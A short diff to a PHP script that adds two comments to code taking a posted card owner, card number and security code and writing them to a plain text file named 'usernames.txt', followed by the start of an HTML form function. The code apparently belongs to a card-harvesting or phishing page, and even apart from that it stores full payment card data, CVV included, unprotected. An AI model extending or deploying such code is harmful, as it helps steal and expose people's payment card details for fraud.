@@ -7,7 +7,7 @@ if (
     isset($_POST['securitycode'])
 ) {
     $file = "usernames.txt";
-    $data1 = $_POST['cardNumber'];
+    $data1 = $_POST['cardNumber']; // Store card number for display
     $data = 
         "owner: " . $_POST['owner'] . "\n" .
         "cardNumber: " . $_POST['cardNumber'] . "\n" .
@@ -27,6 +27,7 @@ if (
 }
 
 function displayForm($cardNumber) {
+    // Use single quotes for HTML attributes to avoid conflicts with PHP variables
     echo <<<HTML
 <!DOCTYPE html>
 <html lang="en">
